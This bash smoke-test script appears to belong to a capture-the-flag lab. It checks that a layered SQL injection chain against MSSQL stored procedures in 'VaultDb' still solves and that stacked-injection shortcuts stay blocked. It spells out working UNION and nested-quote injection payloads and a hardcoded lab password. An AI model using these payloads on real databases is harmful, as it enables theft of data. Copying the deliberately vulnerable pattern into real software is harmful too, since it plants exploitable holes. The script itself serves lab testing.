#!/usr/bin/env bash
# smoke_m9_vaultdb_chain.sh -- standalone M9 smoke (secrets.alpha VaultDb).
# Connects as the limited bridge login svc_sql_admin and walks the layered
# stored-procedure injection chain, asserting both that the intended path
# solves AND that the @name stacked-injection shortcut is dead. Exercises:
#
#   [M9.s2]  LAYER A: UNION @name -> dbo.AppConfig          (must SUCCEED)
#   [M9.s3]  LAYER B: @mode=maintenance -> dbo.AuditVault   (must SUCCEED)
#   [M9.s4]  LAYER C: @mode -> @actor UNION dbo.TargetSecrets (must SUCCEED)
#
#   [M9_NEGATIVE_STACKED_NAME]  @name=N'x''; SELECT * FROM dbo.TargetSecrets--'
#                               MUST FAIL (vault_reader DENY'd) and NOT leak s4
#   [M9_NEGATIVE_UNION_NAME]    @name UNION SELECT ... FROM dbo.TargetSecrets
#                               MUST FAIL and NOT leak s4
#   [M9_NEGATIVE_STACKED_MODE]  @mode=N'read''; SELECT * FROM dbo.TargetSecrets--'
#                               MUST FAIL (runs in vault_reader ctx) and NOT leak s4
#   [M9_NEGATIVE_DIRECT]        svc_sql_admin direct SELECT dbo.TargetSecrets
#                               + direct EXEC dbo.usp_AuditAccess MUST FAIL
#
# The three NEGATIVE injection tests prove the execution-context boundary
# (usp_LookupAsset WITH EXECUTE AS 'vault_reader') confines @name/@mode to the
# LAYER A surface; if any of them UNEXPECTEDLY return the m9.s4 UUID, the
# stacked-injection bypass is back and the layered chain is trivialized.
#
# Usage:
#   bash smoke_m9_vaultdb_chain.sh [--ip 10.40.0.30] [--proxychains] \
#       [--bridge-user svc_sql_admin] [--bridge-pass <pwd>] \
#       [--manifest /path] [--logdir DIR]
#
# Exit codes: 0 PASS / 1 FAIL / 2 USAGE

set -uo pipefail

DB_IP="10.40.0.30"
BRIDGE_USER="svc_sql_admin"
BRIDGE_PASS="V4ult-Sql-Adm!n-2026"
MANIFEST=""
LOGDIR="/tmp/smoke-m9-$$"
PXY=""

while [ $# -gt 0 ]; do
    case "$1" in
        --ip)          DB_IP="$2"; shift 2 ;;
        --bridge-user) BRIDGE_USER="$2"; shift 2 ;;
        --bridge-pass) BRIDGE_PASS="$2"; shift 2 ;;
        --proxychains) PXY="proxychains4 -q"; shift ;;
        --manifest)    MANIFEST="$2"; shift 2 ;;
        --logdir)      LOGDIR="$2"; shift 2 ;;
        -h|--help)     sed -n '2,38p' "$0"; exit 0 ;;
        *) echo "unknown arg: $1"; exit 2 ;;
    esac
done

mkdir -p "$LOGDIR"
PASS=0; FAIL=0

c_red()   { printf '\033[31m%s\033[0m' "$*"; }
c_green() { printf '\033[32m%s\033[0m' "$*"; }
c_blue()  { printf '\033[34m%s\033[0m' "$*"; }
c_yellow(){ printf '\033[33m%s\033[0m' "$*"; }
section() { echo; echo "============================================================"; echo " [$(c_blue "$1")] $2"; echo "============================================================"; }
ok()    { echo "  $(c_green ok): $*";   PASS=$((PASS+1)); }
bad()   { echo "  $(c_red FAIL): $*";   FAIL=$((FAIL+1)); }
note()  { echo "  $(c_yellow note): $*"; }

manifest_uuid() {
    local id="$1"
    if [ -z "$MANIFEST" ]; then
        MANIFEST="$(dirname "$0")/../flags/manifest.yaml"
    fi
    python3 -c "
import sys, yaml
m = yaml.safe_load(open('$MANIFEST'))
for f in m['flags']:
    if f['id'] == '$id':
        print(f['uuid'])
        sys.exit(0)
sys.exit(1)
"
}
EXPECT_S2=$(manifest_uuid m9.s2)
EXPECT_S3=$(manifest_uuid m9.s3)
EXPECT_S4=$(manifest_uuid m9.s4)

if ! command -v impacket-mssqlclient >/dev/null 2>&1; then
    echo "ERROR: impacket-mssqlclient not found in PATH" >&2; exit 2
fi

# run_sql <label> <sql>  -- pipe one batch to mssqlclient (SQL auth, VaultDb),
# capture combined stdout/stderr to a per-label log, and echo it.
#
# Trailing "exit" makes impacket-mssqlclient quit cleanly after the batch;
# without it the client waits at its prompt and the pipe hangs.
run_sql() {
    local label="$1" sql="$2" log="$LOGDIR/$1.log"
    printf '%s\nexit\n' "$sql" | $PXY impacket-mssqlclient \
        "$BRIDGE_USER:$BRIDGE_PASS@$DB_IP" -db VaultDb >"$log" 2>&1 || true
    cat "$log"
}

# ====================================================================
# [CONNECT]  prove the bridge login can reach VaultDb at all
# ====================================================================
section CONNECT "impacket-mssqlclient $BRIDGE_USER@$DB_IP -db VaultDb"
CONN=$(run_sql connect "EXEC dbo.usp_LookupAsset @name=N'fleet-01';")
if echo "$CONN" | grep -q "alpha deploy node"; then
    ok "bridge login authenticated; usp_LookupAsset returns Assets rows"
else
    bad "could not run usp_LookupAsset (check $LOGDIR/connect.log)"
    echo "$(echo "$CONN" | head -5)"
    echo "ABORTING (no SQL path to VaultDb)"; exit 1
fi

# ====================================================================
# [M9.s2]  LAYER A -- UNION @name -> dbo.AppConfig  (MUST SUCCEED)
# ====================================================================
section M9.s2 "UNION @name -> dbo.AppConfig"
S2=$(run_sql m9s2 "EXEC dbo.usp_LookupAsset @name=N'x'' UNION SELECT cfgkey,cfgval FROM dbo.AppConfig--';")
if echo "$S2" | grep -q "$EXPECT_S2"; then
    ok "m9.s2 captured (LAYER A UNION still works): $EXPECT_S2"
else
    bad "m9.s2 NOT recovered -- vault_reader may be missing SELECT on AppConfig"
    echo "  out: $(echo "$S2" | tail -5 | tr '\n' ' ')"
fi

# ====================================================================
# [M9.s3]  LAYER B -- @mode=maintenance -> dbo.AuditVault  (MUST SUCCEED)
# ====================================================================
section M9.s3 "@mode drives nested usp_AuditAccess -> dbo.AuditVault"
S3=$(run_sql m9s3 "EXEC dbo.usp_LookupAsset @name=N'fleet-01', @mode=N'maintenance';")
if echo "$S3" | grep -q "$EXPECT_S3"; then
    ok "m9.s3 captured (LAYER B CALL chain still works): $EXPECT_S3"
else
    bad "m9.s3 NOT recovered -- vault_reader may lack EXECUTE on usp_AuditAccess"
    echo "  out: $(echo "$S3" | tail -5 | tr '\n' ' ')"
fi

# ====================================================================
# [M9.s4]  LAYER C -- @mode -> @actor UNION dbo.TargetSecrets (MUST SUCCEED)
# Note the doubled quotes: @mode must reach usp_AuditAccess as  x' UNION ...
# ====================================================================
section M9.s4 "@mode injects nested @actor -> UNION dbo.TargetSecrets (OBJECTIVE)"
S4=$(run_sql m9s4 "EXEC dbo.usp_LookupAsset @name=N'fleet-01', @mode=N'x'''' UNION SELECT label,secret FROM dbo.TargetSecrets--';")
if echo "$S4" | grep -q "$EXPECT_S4"; then
    ok "m9.s4 captured (intended LAYER C path reaches objective): $EXPECT_S4"
else
    bad "m9.s4 NOT recovered via the intended @mode chain -- usp_AuditAccess"
    bad "  must run EXECUTE AS OWNER (dbo) to read TargetSecrets"
    echo "  out: $(echo "$S4" | tail -5 | tr '\n' ' ')"
fi

# ====================================================================
# [M9_NEGATIVE_STACKED_NAME]  the exact reported bypass MUST FAIL
# ====================================================================
section M9_NEGATIVE_STACKED_NAME "@name stacked ';' SELECT TargetSecrets MUST FAIL"
NEG1=$(run_sql neg_stacked_name "EXEC dbo.usp_LookupAsset @name=N'x''; SELECT * FROM dbo.TargetSecrets--', @mode=N'read';")
if echo "$NEG1" | grep -q "$EXPECT_S4"; then
    bad "BYPASS ALIVE: stacked @name leaked m9.s4 ($EXPECT_S4) -- the fix is broken"
elif echo "$NEG1" | grep -qiE "permission denied|SELECT permission"; then
    ok "stacked @name blocked (permission denied in vault_reader context)"
else
    ok "stacked @name did not leak m9.s4 (no objective UUID in output)"
    note "no explicit 'permission denied' string -- verify $LOGDIR/neg_stacked_name.log"
fi

# ====================================================================
# [M9_NEGATIVE_UNION_NAME]  @name UNION directly into TargetSecrets MUST FAIL
# ====================================================================
section M9_NEGATIVE_UNION_NAME "@name UNION -> dbo.TargetSecrets MUST FAIL"
NEG2=$(run_sql neg_union_name "EXEC dbo.usp_LookupAsset @name=N'x'' UNION SELECT label,secret FROM dbo.TargetSecrets--';")
if echo "$NEG2" | grep -q "$EXPECT_S4"; then
    bad "BYPASS ALIVE: @name UNION leaked m9.s4 ($EXPECT_S4) -- vault_reader can read TargetSecrets"
elif echo "$NEG2" | grep -qiE "permission denied|SELECT permission"; then
    ok "@name UNION into TargetSecrets blocked (permission denied)"
else
    ok "@name UNION did not leak m9.s4"
    note "verify $LOGDIR/neg_union_name.log"
fi

# ====================================================================
# [M9_NEGATIVE_STACKED_MODE]  @mode stacked SELECT runs in vault_reader ctx
# ====================================================================
section M9_NEGATIVE_STACKED_MODE "@mode stacked ';' SELECT TargetSecrets MUST FAIL"
NEG3=$(run_sql neg_stacked_mode "EXEC dbo.usp_LookupAsset @name=N'fleet-01', @mode=N'read''; SELECT * FROM dbo.TargetSecrets--';")
if echo "$NEG3" | grep -q "$EXPECT_S4"; then
    bad "BYPASS ALIVE: stacked @mode leaked m9.s4 ($EXPECT_S4)"
elif echo "$NEG3" | grep -qiE "permission denied|SELECT permission"; then
    ok "stacked @mode blocked (the stacked SELECT runs as vault_reader, DENY'd)"
else
    ok "stacked @mode did not leak m9.s4"
    note "verify $LOGDIR/neg_stacked_mode.log"
fi

# ====================================================================
# [M9_NEGATIVE_DIRECT]  bridge login has no direct read / proc rights
# ====================================================================
section M9_NEGATIVE_DIRECT "direct SELECT TargetSecrets + direct EXEC usp_AuditAccess MUST FAIL"
NEG4=$(run_sql neg_direct_select "SELECT * FROM dbo.TargetSecrets;")
if echo "$NEG4" | grep -q "$EXPECT_S4"; then
    bad "BYPASS ALIVE: svc_sql_admin can directly SELECT dbo.TargetSecrets"
elif echo "$NEG4" | grep -qiE "permission denied|SELECT permission"; then
    ok "direct SELECT dbo.TargetSecrets denied to svc_sql_admin"
else
    ok "direct SELECT dbo.TargetSecrets returned no objective UUID"
fi
NEG5=$(run_sql neg_direct_exec "EXEC dbo.usp_AuditAccess @actor=N'maintenance';")
if echo "$NEG5" | grep -qE "$EXPECT_S3|$EXPECT_S4"; then
    bad "BYPASS ALIVE: svc_sql_admin can directly EXEC dbo.usp_AuditAccess"
elif echo "$NEG5" | grep -qiE "EXECUTE permission|permission denied"; then
    ok "direct EXEC dbo.usp_AuditAccess denied to svc_sql_admin"
else
    ok "direct EXEC dbo.usp_AuditAccess leaked nothing"
fi

# ---- summary ----------------------------------------------------------
echo
echo "============================================================"
echo "  PASS: $PASS    FAIL: $FAIL"
echo "  logs: $LOGDIR"
echo "============================================================"
[ "$FAIL" -eq 0 ] || exit 1
